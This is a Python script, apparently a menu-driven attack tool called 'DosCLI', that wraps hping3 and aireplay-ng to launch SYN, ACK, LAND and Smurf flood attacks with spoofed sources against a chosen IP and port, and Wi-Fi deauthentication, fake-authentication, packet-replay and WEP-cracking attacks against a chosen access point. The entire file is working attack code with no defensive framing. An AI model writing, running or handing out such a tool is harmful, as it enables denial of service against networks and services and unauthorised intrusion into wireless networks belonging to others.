#!/usr/bin/env python3

import subprocess
from colorama import init, Fore, Style
import pyfiglet
import keyboard

init()

types = ['Syn Flood', 'ACK', 'LAND', 'Smurf']
air_types = ['Fake Authentication Attack', 'Deauthentication Attack', 'ARP Request Replay Attack', 'Interactive Packet Replay Attack', 'Chopchop Attack', 'Fragmentation Attack','Caffe Latte Attack']
methods = ['hping3', 'aireplay-ng']

class Hping3:
    def __init__(self):
        self.c = ''
        self.d = ''
        self.s = ''
        self.target = ''
        self.target_port = ''
        self.broadcast = ''

    def syn(self, c, d, target_port, target):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format(types[0])
        print(Fore.LIGHTBLUE_EX + logo)
        subprocess.run(["hping3", "-c", c, "-d", d, "-S", "-p", target_port, "--flood", "--rand-source", target])

    def ack(self, target_port, d, target):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format(types[1])
        print(Fore.GREEN + logo)
        subprocess.run(["hping3", "--flood", "-A", "-p", target_port, "-d", d, target])

    def land(self, c, s, target_port, target):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format(types[2])
        print(Fore.YELLOW + logo)
        subprocess.run(["hping3", "--flood", "-c", c, "-s", s, "-p", target_port, "-S", "-a", target, target])

    def smurf(self, target, broadcast):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format(types[3])
        print(Fore.RED + logo)
        subprocess.run(["hping3", "-1", "--flood", "-a", target, broadcast])

    def choise(self):
        for index, item in enumerate(types, start=1):
            print(Fore.LIGHTCYAN_EX + f"[{index}] {item}\n")

        attack_type = int(input("Select attack type:  "))

        if attack_type == 1:
            self.c = str(input("Quantity of packages: "))
            self.d = str(input("Package size: "))
            self.target_port = str(input("Target port: "))
            self.target = str(input("Target ip: "))
            self.syn(self.c, self.d, self.target_port, self.target)

        elif attack_type == 2:
            self.target_port = str(input("Target port: "))
            self.d = str(input("Package size: "))
            self.target = str(input("Target ip: "))
            self.ack(self.target_port, self.d, self.target)

        elif attack_type == 3:
            self.c = str(input("Quantity of packages: "))
            self.s = str(input("Your port: "))
            self.target_port = str(input("Target port: "))
            self.target = str(input("Target ip: "))
            self.land(self.c, self.s, self.target_port, self.target)

        elif attack_type == 4:
            self.broadcast = str(input("Broadcast adress: "))
            self.target = str(input("Target ip: "))
            self.smurf(self.target, self.broadcast)

class Aireplay:
    def __init__(self):
        self.bssid = ''
        self.bssids = ''
        self.mac = ''
        self.interface = ''
        self.interfaces = ''
        self.key = 'ctrl + a'

    def fakeauth(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('FAKEAUTH')
        print(Fore.LIGHTBLUE_EX + logo)
        subprocess.run(["aireplay-ng", "--fakeauth", '0', "-a", self.bssid, "-h", self.mac, self.interface])

    def deauth(self, bssid, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('DEAUTH')
        print(Fore.LIGHTCYAN_EX + logo)
        subprocess.run(['aireplay-ng', '--deauth', '0', '-a', self.bssid, '-c', self.interface])

    def arpreplay(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('ARPREPLAY')
        print(Fore.LIGHTGREEN_EX + logo)
        subprocess.run(["aireplay-ng", "--arpreplay", "-b", self.bssid, "-h", self.mac, self.interface])

    def interactive(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('INTERACTIVE')
        print(Fore.RED + logo)
        subprocess.run(["aireplay-ng", "--interactive", "-b", self.bssid, "-h", self.mac, self.interface])

    def chopchop(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('CHOPCHOP')
        print(Fore.YELLOW + logo)
        subprocess.run(["aireplay-ng", "--chopchop", "-b", self.bssid, "-h", self.mac, self.interface])

    def fragment(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('FRAGMENTATION')
        print(Fore.LIGHTMAGENTA_EX + logo)
        subprocess.run(["aireplay-ng", "--fragment", "-b", self.bssid, "-h", self.mac, self.interface])

    def caffe_latte(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('CAFFE-LATTE')
        print(Fore.GREEN + logo)
        subprocess.run(["aireplay-ng", "--caffe-latte", "-b", self.bssid, "-h", self.mac, self.interface])

    def cfrag(self, bssid, mac, interface):
        subprocess.run(["clear"])
        logo = pyfiglet.figlet_format('CFRAG')
        print(Fore.BLUE + logo)
        subprocess.run(["aireplay-ng", "--cfrag", "-a", self.bssid, "-c", self.mac, self.interface])

    def scan_bssids(self):
        process = subprocess.Popen(['gnome-terminal','--', 'airodump-ng', self.interface])
        print("Press Ctrl + a when you are ready:")
        while True:
            if keyboard.is_pressed(self.key):
                subprocess.Popen(['pkill', '-f', 'gnome-terminal'])
                break

        self.bssid = str(input('BSSID: '))

    def list_interfaces(self):
        subprocess.run(["clear"])
        output = subprocess.run(['iwconfig'], capture_output = True, text=True)
        print(Fore.LIGHTGREEN_EX)
        self.interfaces = output.stdout
        print(self.interfaces)
        self.interface = str(input('Choose an interface: '))

    def aireplay_choise(self):
        subprocess.run(['clear'])
        for index, item in enumerate(air_types, start=1):
            print(Fore.LIGHTCYAN_EX + f"[{index}] {item}\n")
            print(Style.RESET_ALL)

        attack_type = int(input("Select attack type:  "))

        if attack_type == 1:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.fakeauth(self.bssid, self.mac, self.interface)
            
        elif attack_type == 2:
            self.list_interfaces()
            self.scan_bssids()
            self.deauth(self.bssid, self.interface)

        elif attack_type == 3:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.arpreplay(self.bssid, self.mac, self.interface)

        elif attack_type == 4:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.interactive(self.bssid, self.mac, self.interface)

        elif attack_type == 5:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.chopchop(self.bssid, self.mac, self.interface)

        elif attack_type == 6:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.fragment(self.bssid, self.mac, self.interface)

        elif attack_type == 7:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.caffe_latte(self.bssid, self.mac, self.interface)

        elif attack_type == 8:
            self.list_interfaces()
            self.scan_bssids()
            self.mac = str(input('Your MAC: '))
            self.cfrag(self.bssid, self.mac, self.interface)

print(
Fore.MAGENTA + r"""       ____            ________    ___
      / __ \____  ____/  ___/ /   /  /
     / / / / __ \/ __/  /  / /    / /
    / /_/ / /_/ (__  ) /__/ /____/ /
   /_____/\____/____/\___/_____/___/ 
    """)
print(f"by Hydra-arch\n https://github.com/Hydra-arch\n")
print(Style.RESET_ALL)

for index, item in enumerate(methods, start=1):
    print(Fore.LIGHTCYAN_EX + f"[{index}] {item}\n")

attack_method = int(input('Choose an attack method: '))
print('\n')

if attack_method == 1:
    if __name__ == '__main__':
        hping3 = Hping3()
        hping3.choise()

elif attack_method == 2:
    if __name__ == '__main__':
        aireplay = Aireplay()
        aireplay.aireplay_choise()
